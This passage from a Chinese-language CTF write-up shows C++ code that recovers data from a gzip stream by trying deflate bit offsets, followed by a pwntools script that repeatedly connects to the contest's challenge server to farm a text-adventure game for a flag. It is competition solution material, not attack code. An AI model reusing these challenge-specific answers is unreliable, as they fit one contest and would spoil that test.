<span><span style="color: #403F53">            </span><span style="color: #994CC3">const</span><span style="color: #403F53"> </span><span style="color: #994CC3">int</span><span style="color: #403F53"> ret </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #4876D6">inflate</span><span style="color: #403F53">(s, Z_BLOCK);</span></span>
<span></span>
<span><span style="color: #403F53">            </span><span style="color: #994CC3">if</span><span style="color: #403F53"> (ret </span><span style="color: #994CC3">==</span><span style="color: #403F53"> Z_STREAM_END)</span></span>
<span><span style="color: #403F53">                </span><span style="color: #994CC3">break</span><span style="color: #403F53">;</span></span>
<span></span>
<span><span style="color: #403F53">            </span><span style="color: #994CC3">if</span><span style="color: #403F53"> (ret </span><span style="color: #994CC3">!=</span><span style="color: #403F53"> Z_OK)</span></span>
<span><span style="color: #403F53">                </span><span style="color: #4876D6">printf</span><span style="color: #403F53">(</span><span style="color: #111111">&quot;</span><span style="color: #4876D6">%d</span><span style="color: #C96765"> </span><span style="color: #4876D6">%d</span><span style="color: #AA0982">\n</span><span style="color: #111111">&quot;</span><span style="color: #403F53">, t, ret);</span></span>
<span><span style="color: #403F53">            </span><span style="color: #4876D6">assert</span><span style="color: #403F53">(ret </span><span style="color: #994CC3">==</span><span style="color: #403F53"> Z_OK);</span></span>
<span></span>
<span><span style="color: #403F53">            </span><span style="color: #994CC3">const</span><span style="color: #403F53"> </span><span style="color: #994CC3">int</span><span style="color: #403F53"> unused_bits </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #4876D6">s</span><span style="color: #403F53">-&gt;</span><span style="color: #0C969B">data_type</span><span style="color: #403F53"> </span><span style="color: #994CC3">&amp;</span><span style="color: #403F53"> </span><span style="color: #AA0982">7</span><span style="color: #403F53">;</span></span>
<span><span style="color: #403F53">            </span><span style="color: #994CC3">unsigned</span><span style="color: #403F53"> </span><span style="color: #994CC3">int</span><span style="color: #403F53"> head </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #4876D6">s</span><span style="color: #403F53">-&gt;</span><span style="color: #0C969B">next_in</span><span style="color: #403F53">[</span><span style="color: #994CC3">-</span><span style="color: #AA0982">1</span><span style="color: #403F53">] </span><span style="color: #994CC3">&gt;&gt;</span><span style="color: #403F53"> (</span><span style="color: #AA0982">8</span><span style="color: #403F53"> </span><span style="color: #994CC3">-</span><span style="color: #403F53"> unused_bits);</span></span>
<span><span style="color: #403F53">            </span><span style="color: #994CC3">unsigned</span><span style="color: #403F53"> </span><span style="color: #994CC3">char</span><span style="color: #403F53"> </span><span style="color: #994CC3">*</span><span style="color: #403F53">nxt </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #4876D6">s</span><span style="color: #403F53">-&gt;</span><span style="color: #0C969B">next_in</span><span style="color: #403F53">;</span></span>
<span><span style="color: #403F53">            </span><span style="color: #994CC3">for</span><span style="color: #403F53"> (</span><span style="color: #994CC3">int</span><span style="color: #403F53"> i </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #AA0982">0</span><span style="color: #403F53">; i </span><span style="color: #994CC3">&lt;</span><span style="color: #403F53"> </span><span style="color: #AA0982">4</span><span style="color: #403F53">; </span><span style="color: #994CC3">++</span><span style="color: #403F53">i)</span></span>
<span><span style="color: #403F53">                head </span><span style="color: #994CC3">|=</span><span style="color: #403F53"> </span><span style="color: #4876D6">nxt</span><span style="color: #403F53">[i] </span><span style="color: #994CC3">&lt;&lt;</span><span style="color: #403F53"> (i </span><span style="color: #994CC3">*</span><span style="color: #403F53"> </span><span style="color: #AA0982">8</span><span style="color: #403F53"> </span><span style="color: #994CC3">+</span><span style="color: #403F53"> unused_bits);</span></span>
<span><span style="color: #403F53">            </span><span style="color: #994CC3">if</span><span style="color: #403F53"> (commonHead </span><span style="color: #994CC3">==</span><span style="color: #403F53"> </span><span style="color: #994CC3">-</span><span style="color: #AA0982">1</span><span style="color: #403F53">)</span></span>
<span><span style="color: #403F53">                commonHead </span><span style="color: #994CC3">=</span><span style="color: #403F53"> head;</span></span>
<span><span style="color: #403F53">            </span><span style="color: #994CC3">else</span><span style="color: #403F53"> </span><span style="color: #994CC3">if</span><span style="color: #403F53"> (head </span><span style="color: #994CC3">!=</span><span style="color: #403F53"> commonHead)</span></span>
<span><span style="color: #403F53">            {</span></span>
<span><span style="color: #403F53">                </span><span style="color: #4876D6">s</span><span style="color: #403F53">-&gt;</span><span style="color: #0C969B">avail_out</span><span style="color: #403F53"> </span><span style="color: #994CC3">=</span><span style="color: #403F53"> CHUNK;</span></span>
<span><span style="color: #403F53">                </span><span style="color: #4876D6">s</span><span style="color: #403F53">-&gt;</span><span style="color: #0C969B">next_out</span><span style="color: #403F53"> </span><span style="color: #994CC3">=</span><span style="color: #403F53"> out;</span></span>
<span><span style="color: #403F53">                </span><span style="color: #4876D6">assert</span><span style="color: #403F53">(</span><span style="color: #4876D6">inflate</span><span style="color: #403F53">(s, Z_BLOCK) </span><span style="color: #994CC3">==</span><span style="color: #403F53"> Z_OK);</span></span>
<span><span style="color: #403F53">                </span><span style="color: #4876D6">printf</span><span style="color: #403F53">(</span><span style="color: #111111">&quot;</span><span style="color: #C96765">different head: </span><span style="color: #4876D6">%d</span><span style="color: #C96765"> </span><span style="color: #4876D6">%x</span><span style="color: #C96765"> </span><span style="color: #4876D6">%x</span><span style="color: #AA0982">\n</span><span style="color: #111111">&quot;</span><span style="color: #403F53">, t, head, commonHead);</span></span>
<span><span style="color: #403F53">                </span><span style="color: #994CC3">break</span><span style="color: #403F53">;</span></span>
<span><span style="color: #403F53">            }</span></span>
<span></span>
<span><span style="color: #403F53">            </span><span style="color: #994CC3">if</span><span style="color: #403F53"> (unused_bits </span><span style="color: #994CC3">==</span><span style="color: #403F53"> </span><span style="color: #AA0982">0</span><span style="color: #403F53"> </span><span style="color: #994CC3">&amp;&amp;</span><span style="color: #403F53"> </span><span style="color: #4876D6">foo</span><span style="color: #403F53">.</span><span style="color: #0C969B">next_in</span><span style="color: #403F53"> </span><span style="color: #994CC3">==</span><span style="color: #403F53"> Z_NULL)</span></span>
<span><span style="color: #403F53">                </span><span style="color: #4876D6">inflateCopy</span><span style="color: #403F53">(</span><span style="color: #994CC3">&amp;</span><span style="color: #403F53">foo, s);</span></span>
<span><span style="color: #403F53">        }</span></span>
<span></span>
<span><span style="color: #403F53">        </span><span style="color: #994CC3">int</span><span style="color: #403F53"> len;</span></span>
<span></span>
<span><span style="color: #403F53">        len </span><span style="color: #994CC3">=</span><span style="color: #403F53"> CHUNK </span><span style="color: #994CC3">-</span><span style="color: #403F53"> </span><span style="color: #4876D6">s</span><span style="color: #403F53">-&gt;</span><span style="color: #0C969B">avail_out</span><span style="color: #403F53">;</span></span>
<span><span style="color: #403F53">        </span><span style="color: #4876D6">memcpy</span><span style="color: #403F53">(in, out, len);</span></span>
<span></span>
<span><span style="color: #403F53">        FILE </span><span style="color: #994CC3">*</span><span style="color: #403F53">output </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #4876D6">fopen</span><span style="color: #403F53">(</span><span style="color: #111111">&quot;</span><span style="color: #C96765">output</span><span style="color: #111111">&quot;</span><span style="color: #403F53">, </span><span style="color: #111111">&quot;</span><span style="color: #C96765">wb</span><span style="color: #111111">&quot;</span><span style="color: #403F53">);</span></span>
<span><span style="color: #403F53">        </span><span style="color: #4876D6">fwrite</span><span style="color: #403F53">(out, </span><span style="color: #AA0982">1</span><span style="color: #403F53">, len, output);</span></span>
<span><span style="color: #403F53">        </span><span style="color: #4876D6">fclose</span><span style="color: #403F53">(output);</span></span>
<span></span>
<span><span style="color: #403F53">        </span><span style="color: #994CC3">int</span><span style="color: #403F53"> start </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #AA0982">0</span><span style="color: #403F53">;</span></span>
<span></span>
<span><span style="color: #403F53">        </span><span style="color: #994CC3">for</span><span style="color: #403F53"> (</span><span style="color: #994CC3">int</span><span style="color: #403F53"> offset </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #AA0982">0</span><span style="color: #403F53">; offset </span><span style="color: #994CC3">&lt;</span><span style="color: #403F53"> </span><span style="color: #AA0982">8</span><span style="color: #403F53">; </span><span style="color: #994CC3">++</span><span style="color: #403F53">offset)</span></span>
<span><span style="color: #403F53">        {</span></span>
<span><span style="color: #403F53">            </span><span style="color: #994CC3">for</span><span style="color: #403F53"> (</span><span style="color: #994CC3">int</span><span style="color: #403F53"> j </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #AA0982">0</span><span style="color: #403F53">; j </span><span style="color: #994CC3">&lt;</span><span style="color: #403F53"> </span><span style="color: #AA0982">8000</span><span style="color: #403F53"> </span><span style="color: #994CC3">&amp;&amp;</span><span style="color: #403F53"> j </span><span style="color: #994CC3">&lt;</span><span style="color: #403F53"> len; </span><span style="color: #994CC3">++</span><span style="color: #403F53">j)</span></span>
<span><span style="color: #403F53">            {</span></span>
<span><span style="color: #403F53">                </span><span style="color: #994CC3">if</span><span style="color: #403F53"> (j </span><span style="color: #994CC3">%</span><span style="color: #403F53"> </span><span style="color: #AA0982">1000</span><span style="color: #403F53"> </span><span style="color: #994CC3">==</span><span style="color: #403F53"> </span><span style="color: #AA0982">0</span><span style="color: #403F53">)</span></span>
<span><span style="color: #403F53">                    </span><span style="color: #4876D6">printf</span><span style="color: #403F53">(</span><span style="color: #111111">&quot;</span><span style="color: #C96765">finding start: </span><span style="color: #4876D6">%d</span><span style="color: #C96765"> </span><span style="color: #4876D6">%d</span><span style="color: #AA0982">\n</span><span style="color: #111111">&quot;</span><span style="color: #403F53">, offset, j);</span></span>
<span><span style="color: #403F53">                </span><span style="color: #4876D6">inflateEnd</span><span style="color: #403F53">(s);</span></span>
<span><span style="color: #403F53">                </span><span style="color: #0C969B">delete</span><span style="color: #403F53"> s;</span></span>
<span><span style="color: #403F53">                s </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #0C969B">new</span><span style="color: #403F53"> z_stream;</span></span>
<span><span style="color: #403F53">                </span><span style="color: #4876D6">inflateCopy</span><span style="color: #403F53">(s, </span><span style="color: #994CC3">&amp;</span><span style="color: #403F53">foo);</span></span>
<span><span style="color: #403F53">                </span><span style="color: #4876D6">s</span><span style="color: #403F53">-&gt;</span><span style="color: #0C969B">next_in</span><span style="color: #403F53"> </span><span style="color: #994CC3">=</span><span style="color: #403F53"> in </span><span style="color: #994CC3">+</span><span style="color: #403F53"> j;</span></span>
<span><span style="color: #403F53">                </span><span style="color: #4876D6">s</span><span style="color: #403F53">-&gt;</span><span style="color: #0C969B">avail_in</span><span style="color: #403F53"> </span><span style="color: #994CC3">=</span><span style="color: #403F53"> len </span><span style="color: #994CC3">-</span><span style="color: #403F53"> j;</span></span>
<span><span style="color: #403F53">                </span><span style="color: #4876D6">s</span><span style="color: #403F53">-&gt;</span><span style="color: #0C969B">avail_out</span><span style="color: #403F53"> </span><span style="color: #994CC3">=</span><span style="color: #403F53"> CHUNK;</span></span>
<span><span style="color: #403F53">                </span><span style="color: #4876D6">s</span><span style="color: #403F53">-&gt;</span><span style="color: #0C969B">next_out</span><span style="color: #403F53"> </span><span style="color: #994CC3">=</span><span style="color: #403F53"> out;</span></span>
<span><span style="color: #403F53">                </span><span style="color: #994CC3">if</span><span style="color: #403F53"> (</span><span style="color: #4876D6">inflate</span><span style="color: #403F53">(s, Z_BLOCK) </span><span style="color: #994CC3">!=</span><span style="color: #403F53"> Z_OK)</span></span>
<span><span style="color: #403F53">                    </span><span style="color: #994CC3">continue</span><span style="color: #403F53">;</span></span>
<span><span style="color: #403F53">                </span><span style="color: #994CC3">if</span><span style="color: #403F53"> (CHUNK </span><span style="color: #994CC3">-</span><span style="color: #403F53"> </span><span style="color: #4876D6">s</span><span style="color: #403F53">-&gt;</span><span style="color: #0C969B">avail_out</span><span style="color: #403F53"> </span><span style="color: #994CC3">&lt;</span><span style="color: #403F53"> </span><span style="color: #AA0982">10000</span><span style="color: #403F53">)</span></span>
<span><span style="color: #403F53">                    </span><span style="color: #994CC3">continue</span><span style="color: #403F53">;</span></span>
<span><span style="color: #403F53">                </span><span style="color: #4876D6">s</span><span style="color: #403F53">-&gt;</span><span style="color: #0C969B">avail_out</span><span style="color: #403F53"> </span><span style="color: #994CC3">=</span><span style="color: #403F53"> CHUNK;</span></span>
<span><span style="color: #403F53">                </span><span style="color: #4876D6">s</span><span style="color: #403F53">-&gt;</span><span style="color: #0C969B">next_out</span><span style="color: #403F53"> </span><span style="color: #994CC3">=</span><span style="color: #403F53"> out;</span></span>
<span><span style="color: #403F53">                </span><span style="color: #994CC3">if</span><span style="color: #403F53"> (</span><span style="color: #4876D6">inflate</span><span style="color: #403F53">(s, Z_BLOCK) </span><span style="color: #994CC3">!=</span><span style="color: #403F53"> Z_OK)</span></span>
<span><span style="color: #403F53">                    </span><span style="color: #994CC3">continue</span><span style="color: #403F53">;</span></span>
<span><span style="color: #403F53">                </span><span style="color: #994CC3">if</span><span style="color: #403F53"> (CHUNK </span><span style="color: #994CC3">-</span><span style="color: #403F53"> </span><span style="color: #4876D6">s</span><span style="color: #403F53">-&gt;</span><span style="color: #0C969B">avail_out</span><span style="color: #403F53"> </span><span style="color: #994CC3">&lt;</span><span style="color: #403F53"> </span><span style="color: #AA0982">10000</span><span style="color: #403F53">)</span></span>
<span><span style="color: #403F53">                    </span><span style="color: #994CC3">continue</span><span style="color: #403F53">;</span></span>
<span><span style="color: #403F53">                </span><span style="color: #4876D6">printf</span><span style="color: #403F53">(</span><span style="color: #111111">&quot;</span><span style="color: #C96765">start: </span><span style="color: #4876D6">%d</span><span style="color: #C96765"> </span><span style="color: #4876D6">%d</span><span style="color: #C96765"> </span><span style="color: #4876D6">%d</span><span style="color: #C96765"> </span><span style="color: #4876D6">%llx</span><span style="color: #AA0982">\n</span><span style="color: #111111">&quot;</span><span style="color: #403F53">, j, CHUNK </span><span style="color: #994CC3">-</span><span style="color: #403F53"> </span><span style="color: #4876D6">s</span><span style="color: #403F53">-&gt;</span><span style="color: #0C969B">avail_out</span><span style="color: #403F53">, offset,</span></span>
<span><span style="color: #403F53">                       </span><span style="color: #994CC3">*</span><span style="color: #403F53">(</span><span style="color: #994CC3">unsigned</span><span style="color: #403F53"> </span><span style="color: #994CC3">long</span><span style="color: #403F53"> </span><span style="color: #994CC3">long</span><span style="color: #403F53"> </span><span style="color: #994CC3">*</span><span style="color: #403F53">)out);</span></span>
<span><span style="color: #403F53">                start </span><span style="color: #994CC3">=</span><span style="color: #403F53"> j;</span></span>
<span><span style="color: #403F53">                </span><span style="color: #994CC3">break</span><span style="color: #403F53">;</span></span>
<span><span style="color: #403F53">            }</span></span>
<span><span style="color: #403F53">            </span><span style="color: #994CC3">if</span><span style="color: #403F53"> (start)</span></span>
<span><span style="color: #403F53">                </span><span style="color: #994CC3">break</span><span style="color: #403F53">;</span></span>
<span><span style="color: #403F53">            </span><span style="color: #994CC3">for</span><span style="color: #403F53"> (</span><span style="color: #994CC3">int</span><span style="color: #403F53"> i </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #AA0982">0</span><span style="color: #403F53">; i </span><span style="color: #994CC3">&lt;</span><span style="color: #403F53"> len; </span><span style="color: #994CC3">++</span><span style="color: #403F53">i)</span></span>
<span><span style="color: #403F53">                </span><span style="color: #4876D6">in</span><span style="color: #403F53">[i] </span><span style="color: #994CC3">=</span><span style="color: #403F53"> (</span><span style="color: #4876D6">in</span><span style="color: #403F53">[i] </span><span style="color: #994CC3">&gt;&gt;</span><span style="color: #403F53"> </span><span style="color: #AA0982">1</span><span style="color: #403F53">) </span><span style="color: #994CC3">|</span><span style="color: #403F53"> ((</span><span style="color: #4876D6">in</span><span style="color: #403F53">[i </span><span style="color: #994CC3">+</span><span style="color: #403F53"> </span><span style="color: #AA0982">1</span><span style="color: #403F53">] </span><span style="color: #994CC3">&amp;</span><span style="color: #403F53"> </span><span style="color: #AA0982">1</span><span style="color: #403F53">) </span><span style="color: #994CC3">&lt;&lt;</span><span style="color: #403F53"> </span><span style="color: #AA0982">7</span><span style="color: #403F53">);</span></span>
<span><span style="color: #403F53">        }</span></span>
<span></span>
<span><span style="color: #403F53">        </span><span style="color: #994CC3">if</span><span style="color: #403F53"> (start </span><span style="color: #994CC3">==</span><span style="color: #403F53"> </span><span style="color: #AA0982">0</span><span style="color: #403F53">)</span></span>
<span><span style="color: #403F53">            </span><span style="color: #4876D6">exit</span><span style="color: #403F53">(</span><span style="color: #AA0982">1</span><span style="color: #403F53">);</span></span>
<span></span>
<span><span style="color: #403F53">        </span><span style="color: #4876D6">inflateEnd</span><span style="color: #403F53">(s);</span></span>
<span><span style="color: #403F53">        </span><span style="color: #4876D6">inflateCopy</span><span style="color: #403F53">(s, </span><span style="color: #994CC3">&amp;</span><span style="color: #403F53">foo);</span></span>
<span><span style="color: #403F53">        </span><span style="color: #4876D6">s</span><span style="color: #403F53">-&gt;</span><span style="color: #0C969B">next_in</span><span style="color: #403F53"> </span><span style="color: #994CC3">=</span><span style="color: #403F53"> in </span><span style="color: #994CC3">+</span><span style="color: #403F53"> start;</span></span>
<span><span style="color: #403F53">        </span><span style="color: #4876D6">s</span><span style="color: #403F53">-&gt;</span><span style="color: #0C969B">avail_in</span><span style="color: #403F53"> </span><span style="color: #994CC3">=</span><span style="color: #403F53"> len </span><span style="color: #994CC3">-</span><span style="color: #403F53"> start;</span></span>
<span><span style="color: #403F53">    }</span></span>
<span><span style="color: #403F53">}</span></span></code></pre></div></section>
<p><picture><source type="image/webp" srcset="/assets/gzip-flag1.057e489b.webp"><img srcset="/assets/gzip-flag1.52267d97.png" loading="lazy" src="/assets/gzip-flag1.52267d97.png" width="892" height="800" alt="flag1"></picture></p>
<h3 id="dark-room" class="heading"><a href="#dark-room" class="heading-anchor" aria-label="章节： Dark Room" tabindex="-1"></a><span>Dark Room</span></h3>
<h4 id="level-1-3" class="heading"><a href="#level-1-3" class="heading-anchor" aria-label="章节： Level 1" tabindex="-1"></a><span>Level 1</span></h4>
<p>通过手玩以及查看<a href="https://github.com/tinichu316/Dark_Room">源码</a><span class="mojikumi-line-end">，</span>首先通关得知拿到 flag 需要 sanity 至少为 117%<span class="mojikumi-line-end">，</span>这需要使用最优解通关并使用 help 命令进行一定的回复<span class="mojikumi-line-end">。</span>可以将最优解记录下来然后自动尝试 help<span class="mojikumi-line-end">，</span>在 sanity 足够高时自动通关获得 flag<span class="mojikumi-line-end">。</span></p>
<section class="code-block relative my-6 shadow" itemprop="hasPart" itemscope itemtype="https://schema.org/SoftwareSourceCode" data-v-ad49d235><div class="h-6 items-center rd-t-1 bg-area px-4 dark:bg-#2A313A media-screen:important-flex" style="display:none;" data-v-ad49d235><h5 class="text-3 text-footer" itemprop="programmingLanguage" aria-label="Python 代码块" data-v-ad49d235>Python</h5><ile-root id="ile-5"><button title="复制到剪贴板" class="copy-button b-footer text-footer" data-v-9288569d><span class="i-mdi-content-copy" data-v-9288569d></span><span class="sr-only" role="status" data-v-9288569d></span></button></ile-root><!--ISLAND_HYDRATION_PLACEHOLDER_ile-5--></div><div class="light:hidden" itemprop="text" data-v-ad49d235><pre class="shiki dark" style="background-color: #011627" tabindex="0"><code><span><span style="color: #C792EA">from</span><span style="color: #D6DEEB"> pwn </span><span style="color: #C792EA">import</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">*</span></span>
<span><span style="color: #C792EA">import</span><span style="color: #D6DEEB"> re</span></span>
<span></span>
<span><span style="color: #D6DEEB">count </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">0</span></span>
<span><span style="color: #D6DEEB">max_sanity </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">0</span></span>
<span></span>
<span><span style="color: #C792EA">while</span><span style="color: #D6DEEB"> </span><span style="color: #FF5874">True</span><span style="color: #D6DEEB">:</span></span>
<span><span style="color: #D6DEEB">    sh </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #B2CCD6">remote</span><span style="color: #D6DEEB">(</span><span style="color: #D9F5DD">&#39;</span><span style="color: #ECC48D">chal.thuctf.redbud.info</span><span style="color: #D9F5DD">&#39;</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> </span><span style="color: #F78C6C">50630</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">    sh.</span><span style="color: #B2CCD6">sendlineafter</span><span style="color: #D6DEEB">(</span><span style="color: #C792EA">b</span><span style="color: #D9F5DD">&#39;</span><span style="color: #ECC48D">[...]:</span><span style="color: #D9F5DD">&#39;</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> </span><span style="color: #C792EA">b</span><span style="color: #D9F5DD">&#39;</span><span style="color: #ECC48D">newgame</span><span style="color: #D9F5DD">&#39;</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">    sh.</span><span style="color: #B2CCD6">sendlineafter</span><span style="color: #D6DEEB">(</span><span style="color: #C792EA">b</span><span style="color: #D9F5DD">&#39;</span><span style="color: #ECC48D">[...]:</span><span style="color: #D9F5DD">&#39;</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> </span><span style="color: #C792EA">b</span><span style="color: #D9F5DD">&#39;</span><span style="color: #ECC48D">ouuan</span><span style="color: #D9F5DD">&#39;</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">    sh.</span><span style="color: #B2CCD6">sendlineafter</span><span style="color: #D6DEEB">(</span><span style="color: #C792EA">b</span><span style="color: #D9F5DD">&#39;</span><span style="color: #ECC48D">(y/n)</span><span style="color: #D9F5DD">&#39;</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> </span><span style="color: #C792EA">b</span><span style="color: #D9F5DD">&#39;</span><span style="color: #ECC48D">y</span><span style="color: #D9F5DD">&#39;</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">    sh.</span><span style="color: #B2CCD6">sendlineafter</span><span style="color: #D6DEEB">(</span><span style="color: #C792EA">b</span><span style="color: #D9F5DD">&#39;</span><span style="color: #ECC48D">[ouuan]:</span><span style="color: #D9F5DD">&#39;</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> </span><span style="color: #C792EA">b</span><span style="color: #D9F5DD">&#39;</span><span style="color: #ECC48D">h</span><span style="color: #D9F5DD">&#39;</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">    sh.</span><span style="color: #B2CCD6">sendlineafter</span><span style="color: #D6DEEB">(</span><span style="color: #C792EA">b</span><span style="color: #D9F5DD">&#39;</span><span style="color: #ECC48D">[ouuan]:</span><span style="color: #D9F5DD">&#39;</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> </span><span style="color: #C792EA">b</span><span style="color: #D9F5DD">&#39;</span><span style="color: #ECC48D">h</span><span style="color: #D9F5DD">&#39;</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">    sh.</span><span style="color: #B2CCD6">sendlineafter</span><span style="color: #D6DEEB">(</span><span style="color: #C792EA">b</span><span style="color: #D9F5DD">&#39;</span><span style="color: #ECC48D">[ouuan]:</span><span style="color: #D9F5DD">&#39;</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> </span><span style="color: #C792EA">b</span><span style="color: #D9F5DD">&#39;</span><span style="color: #ECC48D">h</span><span style="color: #D9F5DD">&#39;</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">    sh.</span><span style="color: #B2CCD6">recvuntil</span><span style="color: #D6DEEB">(</span><span style="color: #C792EA">b</span><span style="color: #D9F5DD">&#39;</span><span style="color: #ECC48D">Sanity:</span><span style="color: #D9F5DD">&#39;</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">    sanity_line </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> sh.</span><span style="color: #B2CCD6">recvline</span><span style="color: #D6DEEB">().</span><span style="color: #B2CCD6">decode</span><span style="color: #D6DEEB">()</span></span>
<span><span style="color: #D6DEEB">    sanity </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">int</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">re.</span><span style="color: #B2CCD6">findall</span><span style="color: #D6DEEB">(</span><span style="color: #C792EA">r</span><span style="color: #D9F5DD">&#39;</span><span style="color: #5CA7E4">\d</span><span style="color: #7FDBCA">+</span><span style="color: #D9F5DD">&#39;</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> sanity_line</span><span style="color: #D6DEEB">)</span><span style="color: #D9F5DD">[</span><span style="color: #F78C6C">0</span><span style="color: #D9F5DD">]</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">    count </span><span style="color: #C792EA">+=</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">1</span></span>
<span><span style="color: #D6DEEB">    max_sanity </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">max</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">max_sanity</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> sanity</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C5E478">print</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">sanity</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> max_sanity</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> count</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">if</span><span style="color: #D6DEEB"> sanity </span><span style="color: #C792EA">&lt;</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">120</span><span style="color: #D6DEEB">:</span></span>
<span><span style="color: #D6DEEB">        sh.</span><span style="color: #B2CCD6">close</span><span style="color: #D6DEEB">()</span></span>
<span><span style="color: #D6DEEB">        </span><span style="color: #C792EA">continue</span></span>
<span><span style="color: #D6DEEB">    commands </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #D9F5DD">&#39;&#39;&#39;</span><span style="color: #ECC48D">n</span></span>
<span><span style="color: #ECC48D">n</span></span>
<span><span style="color: #ECC48D">e</span></span>
<span><span style="color: #ECC48D">pickup key</span></span>
<span><span style="color: #ECC48D">w</span></span>
<span><span style="color: #ECC48D">s</span></span>
<span><span style="color: #ECC48D">s</span></span>
<span><span style="color: #ECC48D">e</span></span>
<span><span style="color: #ECC48D">e</span></span>
<span><span style="color: #ECC48D">e</span></span>
<span><span style="color: #ECC48D">pickup trinket</span></span>
<span><span style="color: #ECC48D">use trinket</span></span>
<span><span style="color: #ECC48D">w</span></span>
<span><span style="color: #ECC48D">s</span></span>
<span><span style="color: #ECC48D">usewith key door</span></span>
<span><span style="color: #ECC48D">s</span></span>
<span><span style="color: #ECC48D">s</span></span>
<span><span style="color: #ECC48D">n</span></span>
<span><span style="color: #ECC48D">w</span></span>
<span><span style="color: #ECC48D">w</span></span>
<span><span style="color: #ECC48D">w</span></span>
<span><span style="color: #ECC48D">n</span></span>
<span><span style="color: #ECC48D">pickup key</span></span>
<span><span style="color: #ECC48D">s</span></span>
<span><span style="color: #ECC48D">e</span></span>
<span><span style="color: #ECC48D">e</span></span>
<span><span style="color: #ECC48D">e</span></span>
<span><span style="color: #ECC48D">n</span></span>
<span><span style="color: #ECC48D">n</span></span>
<span><span style="color: #ECC48D">w</span></span>
<span><span style="color: #ECC48D">w</span></span>
<span><span style="color: #ECC48D">n</span></span>
<span><span style="color: #ECC48D">n</span></span>
<span><span style="color: #ECC48D">w</span></span>
<span><span style="color: #ECC48D">w</span></span>
<span><span style="color: #ECC48D">usewith key door</span></span>
<span><span style="color: #ECC48D">n</span><span style="color: #D9F5DD">&#39;&#39;&#39;</span><span style="color: #D6DEEB">.</span><span style="color: #B2CCD6">split</span><span style="color: #D6DEEB">(</span><span style="color: #D9F5DD">&#39;</span><span style="color: #F78C6C">\n</span><span style="color: #D9F5DD">&#39;</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">for</span><span style="color: #D6DEEB"> c </span><span style="color: #C792EA">in</span><span style="color: #D6DEEB"> commands:</span></span>
<span><span style="color: #D6DEEB">        </span><span style="color: #C5E478">print</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">sh.</span><span style="color: #B2CCD6">recvuntil</span><span style="color: #D6DEEB">(</span><span style="color: #C792EA">b</span><span style="color: #D9F5DD">&#39;</span><span style="color: #ECC48D">[ouuan]:</span><span style="color: #D9F5DD">&#39;</span><span style="color: #D6DEEB">)</span><span style="color: #82AAFF">.</span><span style="color: #B2CCD6">decode</span><span style="color: #D6DEEB">())</span></span>
<span><span style="color: #D6DEEB">        </span><span style="color: #C5E478">print</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">c</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">        sh.</span><span style="color: #B2CCD6">sendline</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">c.</span><span style="color: #B2CCD6">encode</span><span style="color: #D6DEEB">())</span></span>
<span><span style="color: #D6DEEB">    sh.</span><span style="color: #B2CCD6">interactive</span><span style="color: #D6DEEB">()</span></span>
